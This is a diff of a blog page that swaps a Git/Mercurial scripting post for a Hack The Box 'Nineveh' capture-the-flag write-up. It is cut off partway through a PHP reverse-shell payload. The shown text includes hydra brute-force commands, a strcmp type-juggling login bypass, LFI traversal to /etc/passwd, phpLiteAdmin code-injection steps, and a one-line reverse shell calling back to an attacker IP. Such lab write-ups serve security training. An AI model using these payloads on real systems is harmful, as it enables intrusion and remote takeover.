@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Git &amp; Mercurial: How to commit-push fast and easily - The Portal of Knowledge</title>
-  <meta property='og:title' content="Git &amp; Mercurial: How to commit-push fast and easily - The Portal of Knowledge">
+  <title>Nineveh write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Nineveh write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="Git and Mercurial are cross-platform, distributed revision-control tools for software development and other version control tasks. We present two bash scripts, one for each tool, to help us commit and push our changes fast and easily. Το Git και το Mercurial είναι εργαλεία κατανεμημένου ελέγχου-αναθεώρησης για ανάπτυξη λογισμικού και άλλες εργασίες ελέγχου έκδοσης. Παρουσιάζουμε δύο σενάρια bash, ένα για κάθε εργαλείο, που μας βοηθάνε να κάνουμε commit και push τις αλλαγές μας γρήγορα και εύκολα.">
-  <meta property="og:description" content="Git and Mercurial are cross-platform, distributed revision-control tools for software development and other version control tasks. We present two bash scripts, one for each tool, to help us commit and push our changes fast and easily. Το Git και το Mercurial είναι εργαλεία κατανεμημένου ελέγχου-αναθεώρησης για ανάπτυξη λογισμικού και άλλες εργασίες ελέγχου έκδοσης. Παρουσιάζουμε δύο σενάρια bash, ένα για κάθε εργαλείο, που μας βοηθάνε να κάνουμε commit και push τις αλλαγές μας γρήγορα και εύκολα.">
-  <meta property="og:image" content="https://alamot.github.io/images/binary_flow.jpg">
+  <meta name="description" content="Write-up for the Nineveh machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Nineveh του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Nineveh machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Nineveh του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/nineveh.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/fast_commit_push/">
+<meta property="og:url" content="https://alamot.github.io/nineveh_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Git &amp; Mercurial: How to commit-push fast and easily |  ",
+    "headline": "Nineveh write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2016-10-17T00:00:00JST",
-    "dateModified": "2016-10-17T00:00:00JST",
+    "datePublished": "2017-12-17T00:00:00JST",
+    "dateModified": "2017-12-17T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -198,9 +198,25 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
         
         
          
-<li><a href="#span-lang-en-git-script-span-span-lang-el-σενάριο-git-span"><span lang="en">Git script</span><span lang="el">Σενάριο Git</span></a></li>
-<li><a href="#span-lang-en-mercurial-script-span-span-lang-el-σενάριο-mercurial-span"><span lang="en">Mercurial script</span><span lang="el">Σενάριο Mercurial</span></a></li>
-<li><a href="#span-lang-en-source-code-span-span-lang-el-πηγαίος-κώδικας-span"><span lang="en">Source code</span><span lang="el">Πηγαίος κώδικας</span></a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
+<ul>
+<li><a href="#http-website-port-80">HTTP website (port 80)</a></li>
+<li><a href="#https-website-port-443">HTTPS website (port 443)</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#getting-shell">Getting shell</a>
+<ul>
+<li><a href="#getting-shell-without-using-phpliteadmin">Getting shell without using PHPLiteAdmin</a></li>
+<li><a href="#getting-shell-using-phpliteadmin">Getting shell using PHPLiteAdmin</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#user-amrois">User amrois</a></li>
+<li><a href="#root">Root</a></li>
+</ul></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -242,115 +258,483 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Git &amp; Mercurial: How to commit-push fast and easily</h1></header>
-            <header lang="el"><h1 class="title">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h1></header>
+            <header lang="en"><h1 id="title" class="title">Nineveh write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Nineveh</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">17 Oct 2016</time>
-            <time lang="el" class="topmargin7">17 Οκτ 2016</time>
+            <time lang="en" class="topmargin7">17 Dec 2017</time>
+            <time lang="el" class="topmargin7">17 Δεκ 2017</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/coding'>
-                <span lang="en">Coding</span>
-                <span lang="el">Προγραμματισμός</span>
+              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
+                <span lang="en">Cybersecurity</span>
+                <span lang="el">Κυβερνοασφάλεια</span>
               </a>
             
             &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
+            
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
+                </a>
             
               <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/linux'>
                 <span lang="en">linux</span>
                 <span lang="el">linux</span>
                 </a>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/git'>
-                <span lang="en">git</span>
-                <span lang="el">git</span>
-                </a>
-            
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/mercurial'>
-                <span lang="en">mercurial</span>
-                <span lang="el">mercurial</span>
-                </a>
-            
          
+         <aside>
+          <section>
+            <header lang="en"><h2>Contents</h2></header>
+            <header lang="el"><h2>Περιεχόμενα</h2></header>
+            <div><nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scanning">Port scanning</a></li>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
+<ul>
+<li><a href="#http-website-port-80">HTTP website (port 80)</a></li>
+<li><a href="#https-website-port-443">HTTPS website (port 443)</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#getting-shell">Getting shell</a>
+<ul>
+<li><a href="#getting-shell-without-using-phpliteadmin">Getting shell without using PHPLiteAdmin</a></li>
+<li><a href="#getting-shell-using-phpliteadmin">Getting shell using PHPLiteAdmin</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#user-amrois">User amrois</a></li>
+<li><a href="#root">Root</a></li>
+</ul></li>
+</ul>
+</nav></div>
+          </section>
+         </aside>
+        
         
 
-<p lang="en">Git and Mercurial are distributed revision-control tools for software development and other version control tasks. We present two bash scripts, one for each tool, to help us commit and push our changes fast and easily.</p>
-<p lang="el">Το Git και το Mercurial είναι εργαλεία κατανεμημένου ελέγχου-αναθεώρησης για ανάπτυξη λογισμικού και άλλες εργασίες ελέγχου έκδοσης. Παρουσιάζουμε δύο σενάρια bash, ένα για κάθε εργαλείο, που μας βοηθάνε να κάνουμε commit και push τις αλλαγές μας γρήγορα και εύκολα.</p>
+<h1 id="enumeration">Enumeration</h1>
 
-<h1 id="span-lang-en-git-script-span-span-lang-el-σενάριο-git-span"><span lang="en">Git script</span><span lang="el">Σενάριο Git</span></h1>
+<h2 id="port-scanning">Port scanning</h2>
 
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span>
-<span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> -eq <span class="m">0</span> <span class="o">]</span>
-<span class="k">then</span>
-  <span class="nb">echo</span> <span class="s2">&#34;No message supplied. Using current date.&#34;</span>
-  git commit -a -m <span class="s2">&#34;Automatic commit </span><span class="k">$(</span>date<span class="k">)</span><span class="s2">&#34;</span> 
-<span class="k">else</span>
-  <span class="nv">str</span><span class="o">=</span><span class="s2">&#34;&#39;</span><span class="nv">$*</span><span class="s2">&#39;&#34;</span>
-  <span class="nb">echo</span> <span class="s2">&#34;Message: </span><span class="nv">$str</span><span class="s2">&#34;</span>
-  bash -c <span class="s2">&#34;git commit -a -m </span><span class="si">${</span><span class="nv">str</span><span class="si">}</span><span class="s2">&#34;</span>
-<span class="k">fi</span>
+<p>We scan the full range of TCP ports using masscan:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.43
+Password: 
 
-git push origin master</code></pre></div>
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2017-12-17 09:45:27 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65536 ports/host]
+Discovered open port 80/tcp on 10.10.10.43                                     
+Discovered open port 443/tcp on 10.10.10.43 </code></pre></div></div></p>
 
-<h1 id="span-lang-en-mercurial-script-span-span-lang-el-σενάριο-mercurial-span"><span lang="en">Mercurial script</span><span lang="el">Σενάριο Mercurial</span></h1>
+<p>We found TCP ports 80 and 443 open. Let&rsquo;s explore them using nmap:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p80,443 10.10.10.43
 
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span>
-<span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> -eq <span class="m">0</span> <span class="o">]</span>
-<span class="k">then</span>
-  <span class="nb">echo</span> <span class="s2">&#34;No message supplied. Using current date.&#34;</span>
-  hg commit -m <span class="s2">&#34;Automatic commit </span><span class="k">$(</span>date<span class="k">)</span><span class="s2">&#34;</span> 
-<span class="k">else</span>
-  <span class="nv">str</span><span class="o">=</span><span class="s2">&#34;&#39;</span><span class="nv">$*</span><span class="s2">&#39;&#34;</span>
-  <span class="nb">echo</span> <span class="s2">&#34;Message: </span><span class="nv">$str</span><span class="s2">&#34;</span>
-  bash -c <span class="s2">&#34;hg commit -m </span><span class="si">${</span><span class="nv">str</span><span class="si">}</span><span class="s2">&#34;</span>
-<span class="k">fi</span>
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-17 11:48 EET
+Nmap scan report for 10.10.10.43
+Host is up (0.078s latency).
 
-hg push</code></pre></div>
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site does not have a title (text/html).
+443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site does not have a title (text/html).
+| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
+| Not valid before: 2017-07-01T15:03:30
+|_Not valid after:  2018-07-01T15:03:30
+|_ssl-date: TLS randomness does not represent time
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.8 (91%), Crestron XPanel control system (89%)</code></pre></div></div></p>
 
-<p lang="en">You can name these scripts with single english letters («g» and «h» respectively, for example) and copy them somewhere in your $PATH. Do not forget to make them executable: chmod +x filename.</p>
-<p lang="el">Μπορείτε να ονομάσετε αυτά τα σενάρια με μονά γράμματα του αγγλικού αλφαβήτου («g» και «h» αντίστοιχα, για παράδειγμα) και να τα αντιγράψετε κάπου μέσα στην $PATH σας. Μην ξεχάσετε να τα καταστήσετε εκτελέσιμα: chmod +x filename.</p>
+<p>We see from ssl-cert the name nineveh.htb, so we add it to the /etc/hosts:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /etc/hosts
+...
+10.10.10.43 nineveh.htb
+...</code></pre></div></div></p>
 
-<p lang="en">From now on you can commit and push your changes by typing just one letter:</p>
-<p lang="el">Από εδώ και στο εξής μπορείτε να κάνετε commit και push τις αλλαγές σας πληκτρολογώντας μονάχα ένα γράμμα:</p>
+<h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
-<div class="bg-black"> 
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ g </code></pre></div>
-</div>
+<h3 id="http-website-port-80">HTTP website (port 80)</h3>
 
-<p lang="en">Optionally, you can provide a commit message, directly and without using quotes, like this:</p>
-<p lang="el">Προαιρετικά, μπορείτε να παρέχετε ένα μήνυμα για το commit, απευθείας και χωρίς χρήση εισαγωγικών, ως εξής:</p>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://nineveh.htb/ /usr/share/dirb/wordlists/big.txt 
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+START_TIME: Sun Dec 17 12:43:18 2017
+URL_BASE: http://nineveh.htb/
+WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt
+-----------------
+GENERATED WORDS: 20458
 
-<div class="bg-black"> 
-<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ g some optional commit message</code></pre></div>
-</div>
+---- Scanning URL: http://nineveh.htb/ ----
+==&gt; DIRECTORY: http://nineveh.htb/department/     
+---- Scanning URL: http://nineveh.htb/ ----
++ http://nineveh.htb/index.html (CODE:200|SIZE:178)                                                                
++ http://nineveh.htb/info.php (CODE:200|SIZE:83769)                                                                
++ http://nineveh.htb/server-status (CODE:403|SIZE:299)</code></pre></div></div>
 
-<p lang="en">If you do not provide a message then the current date is used automatically.</p>
-<p lang="el">Αν δεν παρέχετε κάποιο μήνυμα τότε χρησιμοποιείται αυτόματα η τρέχουσα ημερομηνία.</p>
+<h3 id="https-website-port-443">HTTPS website (port 443)</h3>
 
-<h1 id="span-lang-en-source-code-span-span-lang-el-πηγαίος-κώδικας-span"><span lang="en">Source code</span><span lang="el">Πηγαίος κώδικας</span></h1>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirsearch -u https://nineveh.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -e php
+Extensions: php | Threads: 10 | Wordlist size: 220521
+Target: https://nineveh.htb
 
-<p lang="en">You can find the scripts here:</p>
-<p lang="el">Μπορείτε να βρείτε τα σενάρια εδώ:</p>
+[14:29:06] Starting: 
+[14:29:07] 200 -   49B  - /
+[14:29:17] 301 -  309B  - /db  -&gt;  https://nineveh.htb/db/
+[14:48:14] 403 -  300B  - /server-status
+[14:48:17] 301 -  319B  - /secure_notes  -&gt;  https://nineveh.htb/secure_notes/</code></pre></div></div>
 
-<ul>
-<li><a href="https://github.com/Alamot/code-snippets/blob/master/hg_git/g" target="_blank">g (git)</a></li>
-<li><a href="https://github.com/Alamot/code-snippets/blob/master/hg_git/h" target="_blank">h (mercurial)</a></li>
-</ul>
+<h1 id="getting-shell">Getting shell</h1>
+
+<h2 id="getting-shell-without-using-phpliteadmin">Getting shell without using PHPLiteAdmin</h2>
+
+<p>We visit this URL <a href="http://nineveh.htb/department/" target="_blank">http://nineveh.htb/department/</a> and we meet a login page. There is a different answer if a username exists (&lsquo;Invalid Password!&rsquo; vs &lsquo;Invalid username&rsquo;). This allows us to enum users and verify that user &lsquo;admin&rsquo; exists. We could brute force the password for user admin using hydra and rockyou.txt:</p>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form &#34;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!&#34; 
+Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-17 12:17:11
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking service http-post-form on port 80
+[DATA] with additional data /department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!
+[STATUS] 783.00 tries/min, 783 tries in 00:01h, 14343616 to do in 305:19h, 16 active
+[STATUS] 788.00 tries/min, 2364 tries in 00:03h, 14342035 to do in 303:21h, 16 active
+
+[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 12:23:13</code></pre></div></div>
+
+<p>But I prefer a more elegant solution. Instead of POSTing a password string:</p>
+
+<p>password=notThePassword</p>
+
+<p>we can submit an array:</p>
+
+<p>password[]=</p>
+
+<p>PHP translates such POST variables to an empty array which causes strcmp() to fail due to type juggling:
+strcmp(array(), &ldquo;thePassword&rdquo;) -&gt; NULL</p>
+
+<p>Here is the relevant source code for reference:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/var/www/html/department$ cat login.php</code></pre></div></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="nx">session_start</span><span class="p">();</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])){</span>                        
+    <span class="nx">header</span><span class="p">(</span> <span class="s1">&#39;Location: manage.php&#39;</span> <span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nv">$USER</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+<span class="nv">$PASS</span> <span class="o">=</span> <span class="s1">&#39;1q2w3e4r5t&#39;</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$USER</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">strcmp</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">],</span> <span class="nv">$PASS</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$USER</span><span class="p">;</span>
+            <span class="nx">header</span><span class="p">(</span> <span class="s1">&#39;Location: manage.php&#39;</span> <span class="p">)</span> <span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;Invalid Password!&#34;</span><span class="p">;</span> <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;invalid username&#39;</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="o">...</span>
+</code></pre></div></p>
+
+<p>So, I used burp to send the following request:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/department/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">nineveh.htb</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://nineveh.htb/department/login.php</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=be38h2ulsvdpr40k344iud4097</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">27</span>
+
+username=admin&amp;password[]=0</code></pre></div>
+
+<p>After we login and click on &ldquo;Notes&rdquo; we see some useful hints:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Have you fixed the login page yet! hardcoded username and password is really bad idea!
+
+check your serect folder to get in! figure it out! this is your challenge
+
+Improve the db interface.
+~amrois</code></pre></div></p>
+
+<p>But the URL is even more interesting:</p>
+
+<p><a href="http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt" target="_blank">http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt</a></p>
+
+<p>This seems like a Local File Inclusion (LFI)&hellip; But it is filtered. After several tries we managed to find it:</p>
+
+<p><a href="http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd" target="_blank">http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd</a>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">root:x:0:0:root:/root:/bin/bash
+...
+amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
+...</code></pre></div></p>
+
+<p>But this is too long. Can we improve it? Yes, we can! :D</p>
+
+<p><a href="http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd" target="_blank">http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../etc/passwd</a></p>
+
+<p>Here is the relevant source code for reference:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/var/www/html/department$ cat login.php</code></pre></div></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">...
+<span class="cp">&lt;?php</span>
+  <span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;notes&#39;</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">55</span><span class="p">)</span>
+     <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;File name too long.&#34;</span><span class="p">);</span>
+  <span class="nv">$fileName</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;ninevehNotes&#34;</span><span class="p">))</span>
+    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;No Note is selected.&#34;</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span>
+  <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+...
+</code></pre></div></p>
+
+<p>It&rsquo;s time for some simple maths:
+a) We have a LFI (<a href="http://nineveh.htb/department/manage.php?notes=" target="_blank">http://nineveh.htb/department/manage.php?notes=</a>)
+b) We have phpinfo() (<a href="http://nineveh.htb/info.php" target="_blank">http://nineveh.htb/info.php</a>)</p>
+
+<p>LFI + phpinfo() = SHELL :D</p>
+
+<p>Read this: <a href="https://www.insomniasec.com/downloads/publications/LFI" target="_blank">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf</p>
+
+<p>So, we can get our shell using a script like that:
+<a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py" target="_blank">https://www.insomniasec.com/downloads/publications/phpinfolfi.py</a></p>
+
+<p>I have modified it a little to make it work for our case:
+<a href="https://github.com/Alamot/code-snippets/blob/master/hacking/lfiphpinfo.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/lfiphpinfo.py</a></p>
+
+<p>Don&rsquo;t forget to change LHOST, LPORT inside the script and to setup your listener:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60001</code></pre></div></div></p>
+
+<p>Usage: python2 ./lfiphpinfo.py 10.10.10.43 80 number_of_threads</p>
+
+<p>Because we deal with a racing condition, you may have to run this script a couple of times until it succeeds. But I have tested it and it definitely works. :D</p>
+
+<h2 id="getting-shell-using-phpliteadmin">Getting shell using PHPLiteAdmin</h2>
+
+<p>If we visit URL <a href="https://nineveh.htb/db/" target="_blank">https://nineveh.htb/db/</a> we see a login page for phpLiteAdmin 1.9. Let&rsquo;s search exploits for this:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit phpLiteAdmin 1.9 -w 
+
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection https://www.exploit-db.com/exploits/24044/
+phpLiteAdmin 1.9.6 - Multiple Vulnerabilitiesh ttps://www.exploit-db.com/exploits/39714/</code></pre></div></div></p>
+
+<p>Remote PHP Code Injection: &ldquo;An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.&rdquo;</p>
+
+<p>So we have to login first and then we can inject PHP code in the sqlite database. Let&rsquo;s try some brute force (username doesn&rsquo;t matter in this case):
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hydra 10.10.10.43 -l user -P /usr/share/SecLists/Passwords/phpbb.txt https-post-form &#34;/db/index.php:password=^PASS^&amp;proc_login=true:Incorrect password&#34;
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-17 13:03:16
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 184365 login tries (l:1/p:184365), ~11523 tries per task
+[DATA] attacking service http-post-form on port 443 with SSL
+[DATA] with additional data /db/index.php:password=^PASS^&amp;proc_login=true:Incorrect password
+[STATUS] 183.00 tries/min, 183 tries in 00:01h, 184182 to do in 16:47h, 16 active
+[STATUS] 209.00 tries/min, 627 tries in 00:03h, 183738 to do in 14:40h, 16 active
+[STATUS] 224.29 tries/min, 1570 tries in 00:07h, 182795 to do in 13:36h, 16 active
+[443][http-post-form] host: 10.10.10.43   login: user   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-17 13:10:44</code></pre></div></div></p>
+
+<p>We login and then:</p>
+
+<ol>
+<li>&ldquo;Create a new Database&rdquo; with name &lsquo;somename.php&rsquo;</li>
+<li>Click on &ldquo;Change Database&rdquo; link &lsquo;somename.php&rsquo;</li>
+<li>Create new table on database &lsquo;somename.php&rsquo; with name &lsquo;sometable&rsquo; (Number of Fields: 1)</li>
+<li>Give a name &lsquo;sometext&rsquo; to the field, change its type to &lsquo;TEXT&rsquo; and in its default value put whaterver PHP code you want (Just don&rsquo;t use single quotes because they are already used by the database to enclose its strings. Note that PHP code injection works even if you insert the code in the field name instead of its value.).</li>
+</ol>
+
+<p>Here, for example, I use the code from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a> converted to one-liner by me ^_^:
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&#34;1.0&#34;</span><span class="p">;</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s2">&#34;10.10.15.203&#34;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">60002</span><span class="p">;</span> <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span> <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="s2">&#34;uname -a; w; id; /bin/bash -i&#34;</span><span class="p">;</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="s2">&#34;pcntl_fork&#34;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$pid</span> <span class="o">=</span> <span class="nx">pcntl_fork</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> 